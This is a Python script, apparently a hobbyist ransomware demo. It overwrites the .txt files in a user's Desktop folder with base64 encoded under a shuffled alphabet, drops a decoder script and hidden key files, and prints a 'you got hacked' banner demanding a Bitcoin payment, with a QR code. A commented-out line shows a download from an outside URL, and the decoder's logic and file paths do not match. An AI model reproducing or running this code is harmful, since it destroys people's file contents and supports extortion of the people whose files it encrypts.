import os
import random
import time
import urllib.request

# url_hackerfile = 'http://i3.ytimg.com/vi/J---aiyznGQ/mqdefault.jpg'
# urllib.request.urlretrieve(url_hackerfile,  "/Users/" + os.getlogin() + "/Desktop/dossier/decodeur.py")

base64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
rand = random.sample(range(1, 64), 63)
decode = [random.randrange(63) for i in range(0, 63)]
base64 = [base64[rand[element]] for element in range(0, (len(rand) - 1))]
base64_crypted = "".join(base64)

TGREEN = '\033[32m'  # Green Text
TRED = '\033[31m'  # Red Text
TYELLOW = '\033[33m'  # Yellow Text
ENDC = '\033[m'  # reset to the defaults


def encode(mot):
    mot = mot.encode()
    car_list = []
    car_block = []
    base64string = ''
    for lettre in mot:
        a = bin(lettre)
        car_list.append(a[2:])
    position = 0
    for element in car_list:
        car_list[position] = element.zfill(8)
        position += 1
    car_string = ''.join(car_list)
    for i in range(0, len(car_string), 6):
        car_block.append(car_string[i:i + 6])
    if len(car_block[len(car_block) - 1]) < 6:
        car_block[len(car_block) - 1] += '0' * (6 - len(car_block[len(car_block) - 1]))
    for objet in car_block:
        g = int(objet, base=2)
        base64string += base64_crypted[g]
    if len(base64string) % 4 != 0:
        base64string += '=' * (4 - (len(base64string) % 4))
    return base64string


# crypt files txt
for element in os.listdir("/Users/" + os.getlogin() + "/Desktop/dossier/"):
    if element.endswith('.txt'):
        file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'r')
        newtext = encode(str(file.read()))
        file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'w')
        file.write(newtext)
        file.close()
    else:
        pass


# Create password
password = base64_crypted
# Create decodeur.py
# TODO -> download the file decodeur.py
file_decodeur = open("/Users/" + os.getlogin() + "/Desktop/dossier/decodeur.py", "w+")
file_decodeur.write(
    "import os  \r\nbase64 = '" + base64_crypted + "'\r\ndef decode(mot):\r\n    if len(mot) % 4 == 0:\r\n        mot = mot.replace('=', '')\r\n        car_list = [bin(base64.index(car)) for car in mot]\r\n        list = [element[2:] for element in car_list]\r\n        list = [element.zfill(6) for element in list]\r\n        car_string = ''.join(list)\r\n        car_string = car_string[:(len(car_string) - len(car_string) % 8)]\r\n        car_bytes = int(car_string, base=2).to_bytes(len(car_string) // 8, 'big')\r\n        return car_bytes.decode()\r\n        pass\r\nfile_save = open('/Users/' + os.getlogin() + '/Desktop/mdr/.save.txt', 'r')\r\nrealpass = str(file_save.read())\r\nfile_save.close()\r\npassword = input('password for decrypte your txt files: ')\r\nif password[0] == realpass[0]:\r\n    file_txt = open('/Users/'+os.getlogin()+'/Desktop/mdr/test.txt', 'r')\r\n    test = str(file_txt.read())\r\n    test2 = ''.join(decode(test))\r\n    file_txt = open('/Users/'+os.getlogin()+'/Desktop/mdr/test.txt', 'w+')\r\n    file_txt.write(test2)\r\n    file_txt.close()\r\n    print('your files is now decrypted have a nice day')\r\nelse:\r\n    print('fail wrong password')")
file_decodeur.close()
# Create the hide file with the password for decrypt
file_pass = open("/Users/" + os.getlogin() + "/Desktop/dossier/.pass", "w+")
file_pass.write(os.getlogin())
file_pass.close()
# Create the hide file with the key generate of base64
file_key = open("/Users/" + os.getlogin() + "/Desktop/dossier/.key", "w+")
file_key.write(base64_crypted)
file_key.close()
# print the H4CK3R information
print(
    TGREEN + 80 * "=" + "\n           __    __       ___       ______  __  ___  _______  _______  \n          |  |  |  |     /   \     /      ||  |/  / |   ____||       \ \n          |  |__|  |    /  ^  \   |  ,---- |  `  /  |  |__   |  .--.  |\n          |   __   |   /  /_\  \  |  |     |    <   |   __|  |  |  |  |\n          |  |  |  |  /  _____  \ |  `----.|  .  \  |  |____ |  `--`  |\n          |__|  |__| /__/     \__\ \______||__|\__\ |_______||_______/ \n\n" + 80 * "=" + "\n\n • You just got hacked by the H4CK3R™ \n\n • All your files are been encrypted\n\n • For decrypt your files you must send \n   100$ in btc to the adress below\n" + ENDC + 80 * "=")
time.sleep(3)
print(
    "\n   ▄▄▄▄▄▄▄ ▄ ▄ ▄▄▄▄   ▄▄ ▄▄▄▄▄▄▄\n   █ ▄▄▄ █ ▄██▀▀▀  █ █▄▀ █ ▄▄▄ █\n   █ ███ █ █▀▀▄█ █▀▄██ ▀ █ ███ █\n   █▄▄▄▄▄█ ▄ █▀▄▀▄▀█ █▀▄ █▄▄▄▄▄█              " + TGREEN + "Please send 0.001 BTC" + ENDC + "\n   ▄▄▄▄  ▄ ▄ █▄█▄ ███▄ ▀▄  ▄▄▄ ▄              " + TGREEN + "To this BTC adress by" + ENDC + "\n    ▀▀▄██▄▀ ▄█▄██▀▀▄▄▄ ▀█▀▀▀▄▄█▀\n   █▀ ▄█▄▄█▄██ ▄ ▄ █▄ ▄▀▄ ▀▄█▄▀▀\n   █▄▄ █▄▄█ ▄▄█▀▄▀▀█▄▄█▄██  ▄ ▄█\n   ▀ ▀▀█ ▄█▀██▀▄ █▀▄▄█ ▀█▀█ █▄█▀              " + TGREEN + "If you don't know how" + ENDC + "\n   ▄▀▀█ ▄▄█ ██  ▄█▄ ▄▄ █ ▀▀   █               " + TGREEN + "to get bitcoin? Go to" + ENDC + "\n    ▄▀▀██▄▄█ █▀ ██▀▀██▀█▄▄████▀█              " + TGREEN + "coinbase.com and signup" + ENDC + "\n   ▄▄▄▄▄▄▄ ▀▄▄   ▄ ██ ▄█ ▄ █ █ ▀\n   █ ▄▄▄ █  ▄▄█▀▀▀▄ ▄█ █▄▄▄█ ▄▄ \n   █ ███ █ █▀█▀▄▀▄▀▀ ▀▄ ▀▄█ ▀▀ █\n   █▄▄▄▄▄█ █▀█▄▀▀  █  ▄█ █▄▄▀▄█\n                      \n\n" + 80 * "=")
